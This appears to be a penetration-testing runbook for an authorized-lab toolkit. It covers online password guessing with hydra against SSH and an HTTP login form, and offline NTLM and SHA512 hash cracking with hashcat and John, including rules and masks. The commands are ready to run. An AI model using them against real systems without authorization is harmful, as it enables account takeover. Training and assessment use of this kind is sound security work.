# Runbook 02 — Password & hash cracking

**Goal:** turn captured hashes or a login prompt into credentials, and capture the process
for your report. Authorized lab targets only.

## A. Online dictionary attack (you have a live service)
```bash
ra check 10.10.10.50                      # confirm the host is in scope first
ra-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50
ra-hydra -l admin -P rockyou.txt          10.10.10.50 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```
`(MITRE ATT&CK: T1110.001 — Password Guessing)`  Results land in the engagement `scans/`.

## B. Offline hash cracking (you already have hashes)
Identify the hash first (the advisor helps: `ra-ai "what hash mode is this: <hash>"`).
```bash
# hashcat (GPU if passed through; CPU otherwise)
ra-hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt          # NTLM
ra-hashcat -m 1800 shadow_sha512.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# John, format-driven
ra-john --format=nt ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
ra-john --show ntlm_hashes.txt            # recovered creds
```
Potfiles are saved into the engagement so a resumed run doesn't redo work.
`(MITRE ATT&CK: T1110.002 — Password Cracking)`

## C. Rules & masks (when the wordlist alone fails)
```bash
ra-hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
ra-hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'    # mask / brute for a known pattern
```

## GPU note
Cracking is dramatically faster on a GPU. In Docker that needs `nvidia-container-toolkit`
on the host and the GPU passed to the container (see `docker-compose.yml`). Without it,
`ra-hashcat` runs CPU-only and warns you.

## Deliverable
`commands.log` + potfiles + recovered creds in `engagements/<slug>/` — the evidence trail
for the credential-access section of your report.
